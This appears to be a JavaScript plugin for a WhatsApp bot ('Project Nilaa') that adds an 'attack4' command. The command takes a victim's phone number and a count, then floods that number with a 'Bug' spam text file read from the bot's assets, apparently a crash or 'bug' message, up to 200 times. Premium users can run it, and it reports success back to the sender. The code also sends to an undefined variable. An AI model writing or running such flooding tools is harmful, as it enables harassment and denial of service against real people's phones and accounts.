/* ██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗░░░███╗░░██╗██╗██╗░░░░░░█████╗░░█████╗░
   ██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝░░░████╗░██║██║██║░░░░░██╔══██╗██╔══██╗
   ██████╔╝██████╔╝██║░░██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░░░░██╔██╗██║██║██║░░░░░███████║███████║
   ██╔═══╝░██╔══██╗██║░░██║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░░░░██║╚████║██║██║░░░░░██╔══██║██╔══██║
   ██║░░░░░██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝░░░██║░░░██╗██║░╚███║██║███████╗██║░░██║██║░░██║
   ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ 
                                    by jayarathne_technical                                         */

// ================= import modules ========================== //

const nila = require("../../events");
const { delay } = require('@adiwajshing/baileys');
const chalk = require('chalk');
const config = require('../../config');
const fs = require('fs');
const { M } = require("human-readable");

// ================= start plugin ============================ //

nila.addCommand( 
    { pattern: ["attack4"], desc: `des`, sucReact: "✅", category: [ "tet", "normal" ] ,  },

async (m, conn , { jf } ) => {

// ==================== defination =================== //

// let victim = m.victim

// conn.sendMessage(m.chat , { text : 'jf.victim_id is' + ': ' + jf.victim_id })

let victim = jf.victim_id
// let result = await conn.onWhatsApp(victim2)
let count = jf.count
let spams = ['./assets/src/Spam/text/Bug 05.txt']
let i2 = 0;

// return console.log(victim2)

// ==================== end definations =============== //

// ================== if =========================== //
if (!m.isPrem) { global.catchError = true; return await conn.sendMessage( m.from, { text: nila.errorMessage(config.reply.owner) }, { quoted: m } ); };

if (!count) { count = 50 }
if (!m.isCreator && count > 200 ) { global.catchError = true; return await conn.sendMessage( m.from, { text: nila.errorMessage(`! High value, All Estimated messeges ==> 1 × ${count} = ${count} \n  \nPlease Enter amount less than 200 for the safety of bot number`) }, { quoted: m } ); };
if (!victim) { global.catchError = true; return await conn.sendMessage( m.from, { text: nila.infoMessage(`! Enter Victim number and count correctly\n[ ex :- .spam 94777777777/100 ]\n(Default count is 50)\n(Maximum count 100) \n \nɴᴏᴡ ʙᴏᴛ ʀᴇsᴘᴏɴsᴇ ᴛɪᴍᴇ : ${m.speed}`) }, { quoted: m } ); };
// if (!result.exists ) { global.catchError = true; return await conn.sendMessage( m.from, { text: nila.errorMessage(`Given user ${victim} is Not on WhatsApp`) }, { quoted: m } ); };
if ( m.Nspam.includes(victim)) { 

    console.log(m.Nspam)
    global.catchError = true; await conn.sendMessage( m.from, { text: nila.errorMessage(`Ohh Baby , Try again in future`) }, { quoted: m } );
    return

};

// ================== enfif ======================== //


// ================= code goes here =============== //

await conn.sendMessage( m.from, { text: nila.infoMessage(`sending **${count} spams...`) }, { quoted: m } );

// return
while (i2 < count ) {

    let spam1 =  spams[Math.floor(Math.random() * spams.length)]
    let textx = fs.readFileSync(`${spam1}`)

    await conn.sendMessage(victim2, { text : `${textx}` })

    i2++

}

await conn.sendMessage( m.from, { text: nila.successfullMessage(`sended **${count} spams to number wa.me/${victim} `) }, { quoted: m } );

// ================= end code ================================= //

})

// ================= end plugin ============================== //